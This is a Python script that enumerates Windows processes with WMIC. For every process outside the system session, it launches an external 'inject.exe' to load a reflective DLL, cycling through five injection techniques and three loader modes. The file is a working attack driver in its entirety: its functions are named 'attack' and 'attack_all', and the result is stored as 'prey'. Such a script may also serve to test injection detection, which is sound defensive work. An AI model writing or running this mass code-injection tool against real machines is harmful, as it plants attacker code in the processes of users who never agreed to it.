import subprocess
import re
import os

def get_proc_list():

    cmd = "WMIC PROCESS get Caption,Processid,SessionId"
    wmi_proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, universal_newlines=True)
    proc_list = []
    for line in wmi_proc.stdout:
        r = re.search('(\D+) (\d+) (\D+) (\d+)(\D+)', line)
        if r:
            proc = "".join(r.group(1).split())
            proc_list.append((proc, r.group(2), r.group(4)))
        else:
            print("can't parse [" + line + "]")
    return proc_list


def attack(pid, bin, dll):

    injections = ['CRT', 'STC', 'QUA', 'NQAT', 'NQATE']
    loader = ['R', 'LW', 'LA']
    for i in injections:
        for l in loader:
            cmd = bin + ' ' + str(pid) + ' ' + dll + ' ' + i + ' ' + l
            prey = subprocess.run(cmd, universal_newlines=True).stdout


def attack_all(proc_list, bin, dll):

    for proc in proc_list:
        print(5*'-', proc[0], proc[1], proc[2])
        if (int(proc[2]) == 0):
            print("Skip process in system session")
            continue
        attack(proc[1], bin, dll)


def get_path(file):

    path = ''
    if os.path.exists(file):
        path = file
    else:
        while not path:
            print('Enter a path to %s:'%file)
            path = input()
            path = re.sub('[\'\"]','', path)
            head, tail = os.path.split(path)
            if (not os.path.exists(path)) or (tail != file):
                print ('Invalid path!')
                path = ''
    return path


def main():

    bin = get_path('inject.exe')
    dll = get_path('reflective_dll.dll')
    pl = get_proc_list()
    attack_all(pl, bin, dll)


if __name__=="__main__":
    main()
